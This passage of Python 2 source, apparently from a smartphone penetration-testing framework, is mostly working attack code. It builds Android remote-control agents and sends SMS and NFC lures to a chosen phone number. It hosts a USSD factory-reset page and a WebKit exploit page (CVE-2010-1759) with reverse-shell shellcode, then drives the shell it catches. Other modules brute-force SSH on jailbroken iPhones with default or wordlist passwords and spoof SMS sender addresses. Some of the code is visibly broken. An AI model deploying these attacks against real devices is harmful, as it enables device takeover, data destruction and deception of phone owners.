    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    """

    with open(manifestfile, 'r') as f:
        fc = f.read()
    with open(manifestfile, 'w') as f:
        f.write(re.sub(r'(<uses-permission)', r'%s\1'%inject, fc, count=1))

    stringfile = tempdir + "/" + projectname + "/res/values/strings.xml"
    inject = """
    <string name="key">KEYKEY1</string>
    <string name="controlnumber">155552155554</string>
    <string name="controlIP">192.168.1.108</string>
    <string name="urii">/control</string>
    <string name="controlpath">/androidagent1</string>
    """

    with open(stringfile, 'r') as f:
        fc = f.read()
    with open(stringfile, 'w') as f:
        f.write(re.sub(r'(<\/resources>)', r'%s\1'%inject, fc, count=1))

def copy_agent():
    webpath = config.get("WEBSERVER")
    path = raw_input('Hosting Path: ').strip()    
    filename = raw_input('Filename: ').strip()
    fullpath = webpath + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    location = config.get("ANDROIDAGENT")
    command = "cp " + location + " " + webpath + path + filename
    os.system(command)

def choose_build():
    while True:
        tempdir = config.get("ANDROIDTEMP")
        ipaddress = config.get("IPADDRESS")
        androidagentlocation = config.get("ANDROIDAGENT")
        androidsdk = config.get("ANDROIDSDK")

        files = os.listdir(tempdir)
        i=0
        choices = []
        for f in files:
            if f != "AndroidAgent":
                i+=1
                choices.append(f)
                print "\t" + str(i) + ".) " + f
        print
        print
        choice = raw_input('spf> ').strip()
        pick = int(choice)-1
        if choice == '0':
            return
        elif pick < len(choices):
            partpath = choices[pick]
            fullpath1 = tempdir + "/" + partpath + "/res/values/strings.xml"
            export = "export PATH=${PATH}:" + androidsdk + "/tools:" + "/platform-tools"
            os.system(export)
            controlphone = raw_input('Phone number of the control modem for the agent: ').strip()
            controlkey = raw_input('Control key for the agent: ').strip()
            controlpath = raw_input('Webserver control path for agent: ').strip()
            print
            print
            print "Control Number:" + controlphone 
            print "Control Key:" + controlkey
            print "ControlPath:" + controlpath
            correct = raw_input("Is this correct?(y/n) ").strip().lower()
            if correct == 'y':
                command = "sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" + controlkey + "<\\/string>/' " + fullpath1
                os.system(command)
                command = "sed -i \'s/<string name=\"controlnumber\">.*/<string name=\"controlnumber\">" + controlphone + "<\\/string>/' " + fullpath1
                os.system(command)
                command = "sed -i \'s/<string name=\"controlIP\">.*/<string name=\"controlIP\">" + ipaddress + "<\\/string>/' " + fullpath1
                os.system(command)
                command = "sed -i \'s/<string name=\"controlpath\">.*/<string name=\"controlpath\">\\" + controlpath + "<\\/string>/' " + fullpath1
                os.system(command)
                agentsrc = tempdir + "/" + partpath
                command = androidsdk + "/tools/android update project --path " + tempdir + "\/AndroidAgent" + " --target \"Google Inc.:Google APIs:4\""
                os.system(command)
                command = androidsdk + "/tools/android update project --path " + agentsrc + " --target \"Google Inc.:Google APIs:4\" --library ../AndroidAgent"
                os.system(command)
                command = androidsdk + "/tools/android update project --name " + choices[pick] + " --path "+ agentsrc
                os.system(command)
                command = "ant -f " + agentsrc +  "/build.xml clean debug"
                os.system(command)
                command = "cp " + agentsrc + "/bin/" + partpath + "-debug-unaligned.apk " + androidagentlocation
                os.system(command)

def database_clear():
    choice = raw_input('This will destroy all your data. Are you sure you want to? (y/N)?').strip().lower()
    if choice == 'y':
        db_not_exists = False
        try:
            db = DB(config=config)
        except DBException as e:
            if e[0] == 2:
                print "Database doesn't exist. Creating it"
                db_not_exists = True
            else:
                raise

        queryes = [
            "DROP TABLE IF EXISTS agents",
            "DROP TABLE IF EXISTS data",
            "DROP TABLE IF EXISTS modems",
            "DROP TABLE IF EXISTS remote",
            "DROP TABLE IF EXISTS client",
        ]

        dbtype = config.get("DATABASETYPE")

        if dbtype == "postgres":
            queryes.append("create table agents (id SERIAL NOT NULL PRIMARY KEY, number varchar(12),path varchar(1000), controlkey varchar(7), controlnumber varchar(12), platform varchar(12), osversion varchar(10))")
            queryes.append("create table data (id SERIAL NOT NULL PRIMARY KEY, sms varchar(2000),contacts varchar(1000), picture varchar(100), root varchar(50), ping varchar(2000), file varchar(100), packages varchar(10000), apk varchar(100), ipaddress varchar(16))")
            queryes.append("create table modems (id SERIAL NOT NULL PRIMARY KEY, number varchar(12), path varchar(1000), controlkey varchar(7), type varchar(3))")
            queryes.append("create table remote (id SERIAL NOT NULL PRIMARY KEY, ip varchar(15), exploit varchar(200), vuln varchar(3), agent varchar(3))")
            queryes.append("create table client (id SERIAL NOT NULL PRIMARY KEY, number varchar(12), exploit varchar(200), vuln varchar(3))")

            if db_not_exists:
                os.system("sudo su postgres -c psql -c \"createdb framework\"")

        elif dbtype == "mysql":
            queryes.append("create table agents (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(15),path varchar(1000), controlkey varchar(7), controlnumber varchar(12), platform varchar(12), osversion varchar(10))")
            queryes.append("create table data (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, sms varchar(2000),contacts varchar(1000), picture varchar(100), root varchar(50),ping varchar(2000), file varchar(100), packages varchar(5000),apk varchar(100), ipaddress varchar(16))")
            queryes.append("create table modems (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(12), path varchar(1000), controlkey varchar(7), type varchar(3))")
            queryes.append("create table remote (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, ip varchar(15), exploit varchar(200), vuln varchar(3), agent varchar(3))")
            queryes.append("create table client (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, number varchar(12), exploit varchar(200), vuln varchar(3))")

            if db_not_exists:
                os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create framework -p" + config.get("MYSQLPASS"))

        if db_not_exists:
            db = DB(config=config)
            db_not_exists = False

        for query in queryes:
            db.query(query)

def social():
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")

    while True:
        print
        print
        print "Choose a social engineering or client side attack to launch:"
        print "\t1.) Direct Download Agent"
        print "\t2.) Client Side Shell"
        print "\t3.) USSD Webpage Attack (Safe)"
        print "\t4 ) USSD Webpage Attack (Malicious)"

        choice = raw_input('spf> ').strip()

        if choice == '1':
            direct_download()
            break

        if choice == '2':
            client_side()
            break

        if choice == '3':
            ussdsafe()
            break

        if choice == '4':
            ussddangerous()
            break

        if choice == 'exit' or choice == '0':
            return

def ussddangerous():
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")

    print "WARNING: THIS CAN FACTORY RESET YOUR PHONE IF VULNERABLE.\nFOR PROOF OF CONCEPT USE ONLY! \nUSE THE SAFE VERSION ON PENTESTS"
    path = raw_input('Hosting Path: ').strip()
    filename = raw_input('Filename: ').strip()
    number = raw_input('Phone Number to Attack: ').strip()

    link = "http://" + ipaddress + path + filename
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    sploitfile = webserver + path + filename
    command8 = "touch " + sploitfile
    os.system(command8)
    command9 = "chmod 777 " + sploitfile
    os.system(command9)

    with open(sploitfile, 'w') as f:
        f.write("<html>\n")
        f.write("<head>\n")
        sploit2 = "/redirect.html"
        sploitfile2 = webserver + path + sploit2
        f.write("<meta http-equiv=\"refresh\" content=\"1;url=http://" + ipaddress + path + sploit2 + "\">\n")
        f.write("</head>\n")
        f.write("<frameset>\n")
        f.write("<frame src=\"tel:*2767*3855%23\" />\n")
        f.write("</frameset>\n")
        f.write("</html>\n")

    command8 = "touch " + sploitfile2
    os.system(command8)
    command9 = "chmod 777 " + sploitfile2
    os.system(command9)

    with open(sploitfile2, 'w') as f:
        f.write("<html>\n")
        f.write("<frameset>\n")
        f.write("<frame src=\"tel:*2767*3855%23\" />\n")
        f.write("</frameset>\n")
        f.write("</html>\n")

    modem = get_modem()
    if modem == 0:
        print
        print "No modems found. Attach a modem to use this functionality"
    else:
        db = DB(config=config)

        db.query("SELECT path from modems where id=%s", (modem))
        path2 = db.fetchone()[0].replace('"', '')

        db.query("SELECT controlkey from modems where id=%s", (modem))
        key2 = db.fetchone()[0]

        db.query("SELECT type from modems where id=%s", (modem))
        modemtype2 = db.fetchone()[0]
        if modemtype2 == 'usb':
            usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
            usb.write("ATZ\r\n")
            time.sleep(1)

            line = usb.read(255)
            print line
            time.sleep(1)

            usb.write("AT+CMGF=1\r\n")
            line = usb.read(255)
            print line
            time.sleep(1)

            numberline = "AT+CMGS=\"" + number + "\"\r\n"
            usb.write(numberline)
            line = usb.read(255)
            print line
            time.sleep(1)
            msg = "This is a cool page: " + link
            usb.write(msg + struct.pack('b',26))
            time.sleep(2)
            line = usb.read(255)
            print line
            time.sleep(1)
            usb.close()
        elif modemtype2 == 'app':
            control = webserver + path2 + "/getfunc"
            command2 = key2 + " " + "SEND" + " " + number + " " + "This is a cool page: " + link
            with open(control, 'w') as f:

                f.write(command2)

def ussdsafe():
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")    
    path = raw_input("Hosting Path: ").strip()
    filename = raw_input("Filename: ").strip()
    number = raw_input("Phone Number to Attack: ").strip()

    link = "http://" + ipaddress + path + filename
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    sploitfile = webserver + path + filename
    command8 = "touch " + sploitfile
    os.system(command8)
    command9 = "chmod 777 " + sploitfile
    os.system(command9)
    with open(sploitfile, 'w') as f:
        f.write("<html>\n")
        f.write("<head>\n")
        sploit2 = "/redirect.html"
        sploitfile2 = webserver + path + sploit2
        f.write("<meta http-equiv=\"refresh\" content=\"1;url=http://" + ipaddress  + path + sploit2 + "\">\n")
        f.write("</head>\n")
        f.write("<frameset>\n")
        f.write("<frame src=\"tel:*%2306%23\" />\n")
        f.write("</frameset>\n")
        f.write("</html>\n")

    command8 = "touch " + sploitfile2
    os.system(command8)
    command9 = "chmod 777 " + sploitfile2
    os.system(command9)
    with open(sploitfile2, 'w') as f:
        f.write("<html>\n")
        f.write("<frameset>\n")
        f.write("<frame src=\"tel:*%2306%23\" />\n")
        f.write("</frameset>\n")
        f.write("</html>\n")

    modem = get_modem()
    if modem == 0:
        print "\nNo modems found. Attach a modem to use this functionality"
    else:
        username = config.get("MYSQLUSER")
        password = config.get("MYSQLPASS")
        port = config.get("MYSQLPORT")
        type = config.get("DATABASETYPE")
        db = DB(config=config)
        db.query("SELECT path from modems where id=%s", (modem,))
        path2 = db.fetchone()[0].replace('"', '')
        db.query("SELECT controlkey from modems where id=%s", (modem,))
        key2 = db.fetchone()[0]
        db.query("SELECT type from modems where id=%s", (modem))
        modemtype2 = db.fetchone()[0]
        if modemtype2 == "usb":
            usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
            usb.write("ATZ\r\n")
            time.sleep(1)
            line = usb.read(255)
            print line
            time.sleep(1)
            usb.write("AT+CMGF=1\r\n")
            line = usb.read(255)
            print line
            time.sleep(1)
            numberline = "AT+CMGS=\"" + number + "\"\r\n"
            usb.write(numberline)
            line = usb.read(255)
            print line
            time.sleep(1)
            msg = "This is a cool page: " + link
            usb.write(msg + struct.pack('b',26))
            time.sleep(2)
            line = usb.read(255)
            print line
            time.sleep(1)
        elif modemtype2 == "app":
            control = webserver + path2 + "/getfunc"
            with open(control, 'w') as f:
                command2 = key2 + " " + "SEND" + " " + number + " " + "This is a cool page: " + link
                f.write(command2)

def client_side():
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    shellipaddress = config.get("SHELLIPADDRESS")

    while True:
        print "Select a Client Side Attack to Run\n"
        print "\t1) CVE=2010-1759 Webkit Vuln Android\n"
        choice1 = raw_input('spf> ').strip()
        if choice1 == 'exit' or choice1 == '0':
            return

        if choice1 == '1':
            path = raw_input('Hosting Path: ').strip()
            filename = raw_input('Filename: ').strip()
            method = raw_input('Delivery Method(SMS or NFC): ').strip().lower()

            if method == "sms":
                number = raw_input('Phone Number to Attack: ').strip()
                custom = raw_input('Custom text(y/N)? ').strip().lower()

            link = "http://" + ipaddress + path + filename

            fullpath = webserver+ path
            command1 = "mkdir " + fullpath
            os.system(command1)

            octets = shellipaddress.split('.')

            hex1 = "%.2x"%int(octets[0])
            hex2 = "%.2x"%int(octets[1])
            hex3 = "%.2x"%int(octets[2])
            hex4 = "%.2x"%int(octets[3])

            sploitfile = webserver + path + filename
            command8 = "touch " + sploitfile
            os.system(command8)
            command9 = "chmod 777 " + sploitfile
            os.system(command9)

            with open(sploitfile, 'w') as f:
                lines = [
                    "<html>\n",
                    "<head>\n",
                    "<script>\n",
                    "var ip = unescape(\"\\u" + hex2 + hex1 + "\\u" + hex4 + hex3 + "\");\n",
                    "var port = unescape(\"\\u3930\");\n",
                    "function trigger()\n",
                    "{\n",
                    "var span = document.createElement(\"div\");\n",
                    "document.getElementById(\"BodyID\").appendChild(span);\n",
                    "span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n",
                    "}\n",
                    "function exploit()\n",
                    "{\n",
                    "var nop = unescape(\"\\u33bc\\u0057\");\n",
                    "do\n",
                    "{\n",
                    "nop+=nop;\n",
                    "} while (nop.length<=0x1000);\n",
                    "var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n",
                    "scode += port;\n",
                    "scode += ip;\n",
                    "scode += unescape(\"\\u2000\\u2000\");\n",
                    "target = new Array();\n",
                    "for(i = 0; i < 0x1000; i++)\n",
                    "target[i] = scode;\n",
                    "for (i = 0; i <= 0x1000; i++)\n",
                    "{\n",
                    "document.write(target[i]+\"<i>\");\n",
                    "if (i>0x999)\n",
                    "{\n",
                    "trigger();\n",
                    "}\n",
                    "}\n",
                    "}\n",
                    "</script>\n",
                    "</head>\n",
                    "<body id=\"BodyID\">\n",
                    "Enjoy!\n",
                    "<script>\n",
                    "exploit();\n",
                    "</script>\n",
                    "</body>\n",
                    "</html>\n",
                ]
                f.writelines(lines)

            modem = get_modem()
            if modem == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                db = DB(config=config)
                db.query("SELECT path from modems where id=%s", (modem,))
                path2 = db.fetchone()[0].replace('"', '')
                db.query("SELECT controlkey from modems where id=%s", (modem,))
                key2 = db.fetchone()[0]
                db.query("SELECT type from modems where id=%s", (modem,))
                modemtype2 = db.fetchone()[0]
                if modemtype2 == "usb":
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    time.sleep(1)
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    numberline = "AT+CMGS=\"" + number + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    if custom == "n":
                        msg = "This is a cool page: " + link

                    elif custom == "y":
                        customtext = raw_input('Enter SMS text: ').strip()
                        msg = customtext + " " + link

                    usb.write(msg + struct.pack('b', 26))
                    time.sleep(2)
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    usb.close()

                elif modemtype2 == "app":
                    control = webserver + path2 + "/getfunc"
                    with open(control, 'w') as f:
                        if method == "sms":
                            if custom == "n":
                                msg = "This is a cool page: " 
                            elif custom == "y":
                                customtext = raw_input('Enter SMS text: ').strip()
                                msg = customtext
                            command2 = key2 + " " + "SEND" + " " + number + " " + msg + link
                        elif method == "nfc":
                            command2 = key2 + " " + "NFCC" + " " + link
                        f.write(command2)

                vulnerable = "no"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(180)
                s.bind((str(shellipaddress), 12345))
                s.listen(1)
                data_socket = None
                try:
                    data_socket, addr = s.accept()
                except socket.timeout:
                    pass
                if data_socket:
                    print "Connected: Try exit to quit"
                    data="/system/bin/id\n"
 		    data_socket.sendall(data)
                    data = data_socket.recv(1024)
                    print data

                    while True:
                        data = raw_input().strip()
			
			if data == "exit":
                             data_socket.close()
			     break
                        data = data + "\n"
                        data_socket.sendall(data)
                        data = data_socket.recv(1024)
                        print data
                    vulnerable = "yes"

                print "\nVulnerable: " + vulnerable
                print
                print
                table = "client"

                _type = config.get("DATABASETYPE")
                db = DB(config=config)

                webkit = "webkit"

                db.query("INSERT INTO "+table+" (id,number,exploit,vuln) VALUES (DEFAULT,%s,%s,%s)", (number, webkit, vulnerable))
                break

def direct_download():
    ipaddress = config.get("IPADDRESS")
    webserver = config.get("WEBSERVER")
    while True:
        print "This module sends an SMS with a link to directly download and install an Agent"
        which = raw_input('Deliver Android Agent or Android Meterpreter (Agent/meterpreter:) ').strip()
        if which == "meterpreter":
		platform = "meterpreter"
	else :	
	       platform = raw_input('Platform(Android/iPhone/Blackberry):').strip().lower()
        path = raw_input('Hosting Path: ').strip()
        filename = raw_input('Filename: ').strip()
        method = raw_input('Delivery Method:(SMS or NFC): ').strip().lower()

        if method == "sms":
            number = raw_input('Phone Number to Attack: ').strip()
            custom = raw_input('Custom text(y/N)? ').strip().lower()

        if platform == "android":
	   location = config.get("ANDROIDAGENT")
	if platform == "meterpreter":
	    location = config.get("ANDROIDMETERPRETER")
        link = "http://" + ipaddress + path + filename
        fullpath = webserver + path
        command1 = "mkdir " + fullpath
        os.system(command1)
        location = config.get("ANDROIDAGENT")
        command = "cp " + location + " " + webserver + path + filename
        os.system(command)
        modem = get_modem()
        if modem == 0:
                print
                print "No modems found. Attach a modem to use this functionality"
                print
        else:
                db = DB(config=config)

                db.query("SELECT path from modems where id=%s", (modem,))
                path2 = db.fetchone()[0].replace('"', '')

                db.query("SELECT controlkey from modems where id=%s", (modem,))
                key2 = db.fetchone()[0]

                db.query("SELECT type from modems where id=%s", (modem,))
                modemtype2 = db.fetchone()[0]

                if modemtype2 == "usb":
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    time.sleep(1)

                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    numberline = "AT+CMGS=\"" + number + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    if custom == "n":
                        msg = "This is a cool app: " + link
                    elif custom == "y":
                        customtext = raw_input('Enter SMS text: ').strip()
                        msg = customtext + " " + link
        
                    usb.write(msg + struct.pack('b', 26))
                    time.sleep(5)
                    line = usb.read(255)
                    print line
                    time.sleep(1)
                    usb.close()
                elif modemtype2 == "app":
                    control = webserver + path2 + "/getfunc"
                    with open(control, 'w') as f:
                        if method == "sms":
                            if custom == "n":
                                msg = "This is a cool app: "
                            elif custom == "y":
                                customtext = raw_input('Enter SMS text: ').strip()
                                msg = customtext
                            command2 = key2 + " " + "SEND" + " " + number + " " + msg + link

                        elif method == "nfc":
                            command2 = key2 + " " + "NFCC" + " " + link

                        f.write(command2)
                break

def remote_attack():
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    while True:
        print
        print
        print "Choose a remote attack to launch:"
        print "\t1.) Test for Default SSH Password (iPhone)"
        print "\t2.) Guess SSH Password (iPhone)"
        print "\t3.) Spoof Sender Address SMS (iPhone)"
        choice1 = raw_input('spf> ').strip()
        if choice1 == '1':
            alpine()
        if choice1 == '2':
            sshguess()
        if choice1 == '3':
            senderspoof()
        if choice1 == "exit" or choice1 == '0':
            return

def getusbmodem():
    while True:
        db = DB(config=config)
        _type = config.get("DATABASETYPE")
        if _type == "postgres":
            rowsquery = "SELECT COUNT(*) from modems where type=" + "\'usb\'"

        if _type == "mysql":
            rowsquery = "SELECT COUNT(*) from modems where type=" + "\"usb\""

        db.query(rowsquery)
        row = db.fetchone()[0]
        if row == 0:
            return 0
        if row == 1:
            return 1
        print
        print
        print "Available Modems:"
        print
        db.query("SELECT COUNT(*) from modems")
        row2 = db.fetchone()[0]
        for i in range(1, row2+1):
            db.query("SELECT type from modems where id=%s", (i,))
            r = db.fetchone()[0]
            if r == "usb":
                db.query("SELECT number from modems where id=%s", (i,))
                r = db.fetchone()[0]
                print "\t" + str(i) + ".) " + r
        print
        print "Select a modem to interact with"
        print
        chosenmodem = raw_input('spf> ').strip()
        if int(chosenmodem) <= row2:
            return chosenmodem

def senderspoof():

    print "This module allows you to spoof the Reply-to address on an SMS using the User Data Header (UDH). This attack only works against iPhones. Currently this attack requires a USB mobile modem and does not work  with the SPF app."
    print "Select a USB modem to use for the attack:"
    modem = getusbmodem()
    if modem == 0:
        print "\nNo USB modems found. Attach a USB modem to use this functionality"
    else: 
        print "This functionality isn't perfect yet. There is something is wrong with the fill bits on the UDH if it does not meet on a septet boundary. The message will be managled. To get it to work use a 4 digit spoofed number ie 1234 or 9999."
        print        
        numberattack = raw_input('Number to Attack: ').strip()
        message = raw_input('Message: ').strip()
        spoof = raw_input('Spoofed Reply-To Address: ').strip()
        print
        print
        print "Number to Attack: " + numberattack
        print "Message: " + message
        print "Spoofed Reply-To Address: " + spoof
        correct = raw_input('Is this correct?(y/N): ').strip()

        if correct.lower() == "y":
            pdu = "004100"
            ef = 0
            _len = len(numberattack)
            if _len % 2:
                ef = 1
            attacklenhex = "%02X"%_len
            pdu = pdu + attacklenhex
            scrambledattack = ''
            
            for i in range(0, len-2, 2):
                sub = numberattack[i+1]
                scrambledattack += sub
                sub = numberattack[i]
                scrambledattack += sub

            if ef == 1:
                scrambledattack = scrambledattack + "F"
                sub = numberattack[_len - 1]
                scrambledattack = scrambledattack + sub
            else: 
                sub = numberattack[i+1]
                scrambledattack = scrambledattack + sub
                sub = numberattack[i]
                scrambledattack = scrambledattack + sub
            
            pdu = pdu + "91" + scrambledattack + "0000"
            eff = 0
            _len = len(spoof)
            if _len % 2:
                eff = 1

            spooflenhex = "%02X"%_len
            scrambledspoof = ''

            for i in range(0, len-2, 2):
                sub = spoof[i+1]
                scrambledspoof = scrambledspoof + sub
                sub = spoof[i]
                scrambledspoof = scrambledspoof + sub

            if eff == 1:
                scrambledspoof = scrambledspoof + "F"
                sub = spoof[_len - 1]
                scrambledspoof = scrambledspoof + sub
            else:
                sub = spoof[i+1]
                scrambledspoof = scrambledspoof + sub
                sub = spoof[i]
                scrambledspoof = scrambledspoof + sub

            uhd = spooflenhex + "91" + scrambledspoof
            udhlen1 = len(uhd)/2
            uhd = "220" + udhlen1 + uhd
            udhlen2 = len(uhd)/2
            more = ((udhlen2 + 1) * 8) % 7
            if more != 0:
                more2 = '0' * (7 - more)
            else:
                more2 = ""

            uhdlenhex = "%02X"%udhlen2
            uhd = uhdlenhex + uhd                
            bin = ''
            _len = len(message);
            bits = ''.join(['%08d'%int(bin(ord(i))[2:]) for i in message])
            bits = more2 + bits
            bitslength = length(bits)
            octetlength = bitslength/8

            septets = ''
            for i in range(0, octetlength):
                start = i * 8
                _oct = str(bits)[start:start+8]
                sept = _oct('')[1:1+7]
                septets = septets + sept;    

            septetlength = length(septets)/7
            eat = 1
            eaten = 0
            ud = ""
            for j in range(0, septetlength - 1):
                start = j * 7
                first = str(septets)[start:start+(7-eaten)]
                start2 = (j + 1) * 7
                second = str(septets)[start2:start2+7]
                food = 7-eat
                stolen = second[food:food+eat]
                encode = stolen + first
                hexy = "%.2x"%int(encode, 2)
                eat+=1
                eat = (eat % 8)
                eaten+=1
                eaten = eaten % 8
                ud = ud + hexy

            first = septets[((septetlength-1)*7):((septetlength-1)*7)+(7-eaten)]
            #print "\n First: " + first + "\n"; 
            fill = 1 + eaten
            zeos = "0" * fill
            encode = zeos + first
            #print "\n Encode: " + encode + "\n";
            hexy = "%.2x"%int(encode, 2)
            ud += hexy
            #print "\nUD: " + ud + "\n"
            ud = uhd + ud
            udlength = len(ud)
            udlength2 = udlength/2
            extra = int(udlength2/7)
            udlength3 = udlength2 + extra
            udlenhex = "%02X"%udlength3
            pdu = pdu + udlenhex + ud
            #print "\n PDU: " + pdu + "\n"
            pdulen = (len(pdu)/2) - 1
            #print "PDULENGTH: " + pdulen + "\n"
            usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
            usb.write("ATZ\r\n")
            time.sleep(1)
            line = usb.read(255)
            print line
            time.sleep(1)
            usb.write("AT+CMGF=0\r\n")
            line = usb.read(255)
            print line
            time.sleep(1)
            usb.write("AT+CMGS=" + pdulen + "\r\n")
            #usb->write("AT+CMGS=27\r\n")

            line = usb.read(255)
            print line
            time.sleep(1)
            msg = pdu
            #msg = "0041000B916110831316F900000F0A22080B915117344588F142A701"
            usb.write(msg + struct.pack('b',26))
            time.sleep(10)
            line = usb.read(255)
            print line
            usb.close()
def sshguess():
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    while True:
        print "This module attempts to guess the password for an Jailbroken iPhone on the local network by reading from a supplied password list"
        ipaddress = raw_input('IP address: ').strip()
        passfile = raw_input('Password file: ').strip()
        print
        print "IP Address:" + ipaddress
        print "Password file:" + passfile 
        correct = raw_input('Is this correct?(y/N): ').strip().lower()
        if correct == "y":
            guesspass(ipaddress, passfile)
            break

def guesspass(ipaddress, passfile):
    vulnerable = "no"
    agent = "no"
    command = 'sftp'
    param = "root@" + ipaddress
    timeout = 10
    notfound = "ssh: connect to host " + ipaddress + " port 22: Connection refused"
    passwordstring = param + "'s password: "
    location = config.get("IPHONEAGENT")
    putfile = location
    connectstring = "Connecting to " + ipaddress + "..."
    installcommand = "dpkg -i " + "iphone.deb" + "\n"
    guesspassword = "null"
    if os.path.exists(passfile):
        f = open(passfile, 'r')
        _lines = f.readlines()
        for _line in _lines:
            guess = _line
            guess2 = guess + "\n"

            try:
                exp = pexpect.spawn(command +' '+ param)
            except Exception, e:
                print 'Cannot spawm sftp command'
                return 1

            exp.expect(connectstring, timeout)
            exp.expect("Are you sure you want to continue connecting (yes/no)?")
            exp.sendline('yes')
            exp.expect(passwordstring, timeout)
            exp.sendline(guess)
            if exp.expect("sftp>", timeout):
                vulnerable="yes"
                print "PASSWORD FOUND: " + guess
                guesspassword = guess
                exp.send("put putfile\n")
                exp.expect("sftp>", timeout)
                exp.sendline("bye")
                command2 = "ssh"
                exp = pexpect.spawn(command2 + ' ' + param)
                exp.expect(passwordstring, timeout)
                exp.sendline(guess)
                exp.expect(['root'], timeout)
                exp.send(installcommand)
                exp.expect("Setting up com.bulbsecurity.tooltest (0.0.1-23) ...", timeout)
                exp.send("tooltest\n")
                if exp.expect(["Smartphone Pentest Framework Agent"], timeout):
                    agent="yes"

                exp.sendline("exit")
                exp.close()
                break

    print
    print "Vulnerable: " + vulnerable + "\nAgent: " + agent
    print
    table = "remote"
    guessstring = "Guess: " + guesspassword    

    db = DB(config=config)
    db.query("INSERT INTO " + table + " (id,ip,exploit,vuln,agent) VALUES (DEFAULT,%s,%s,%s,%s)", (ipaddress,guessstring,vulnerable,agent))

def alpine():
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")

    while True:
        print "This module tests for an Jailbroken iPhone with a default password on the local network\n"
        ipaddress = raw_input('IP address: ').strip()
        correct = raw_input("\n\nIP Address:" +  ipaddress +  "\nIs this correct?(y/N): ").strip().lower()

        if correct == "y":
            vulnerable = "no"
            agent = "no"
            command = 'sftp'
            param = "root@" + ipaddress
            timeout = 10
            notfound = "ssh: connect to host " + ipaddress + " port 22: Connection refused"
            passwordstring = param + "'s password: "
            location = config.get("IPHONEAGENT")
            putfile = location
            connectstring = "Connecting to " + ipaddress + "..."
            installcommand = "dpkg -i " + "iphone.deb" + "\n"

            try:
                exp = pexpect.spawn(command +' '+ param)
            except Exception, e:
                print 'Cannot spawm sftp command'
                return 1

            try:
                exp.expect([connectstring], timeout)
            except pexpect.TIMEOUT:
                pass

            exp.expect(["Are you sure you want to continue connecting (yes/no)?"], timeout)
            exp.sendline("yes")
            exp.expect(passwordstring, timeout)
            exp.send("alpine\n")
            if exp.expect(["sftp>"], timeout):
                vulnerable="yes"
                print "Vulnerable\n"

            exp.send("put putfile\n")
            exp.expect(["sftp>"], timeout)
            exp.send("bye\n")
            command2 = "ssh"
            exp = pexpect.spawn(command2 + ' ' + param)
            exp.expect(passwordstring, timeout)
            exp.send("alpine\n")
            exp.expect([r'root\s*'], timeout);
            #installcommand = "dpkg -i  com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb\n"
            exp.send(installcommand)
            exp.expect(timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...")
            exp.send("tooltest\n")
            if exp.expect(["Smartphone Pentest Framework Agent"], timeout):
                agent="yes"

            exp.sendline("exit")
            exp.close()
            print "\nVulnerable: " + vulnerable + "\nAgent: " + agent
            table = "remote"
            alpine = "alpine"
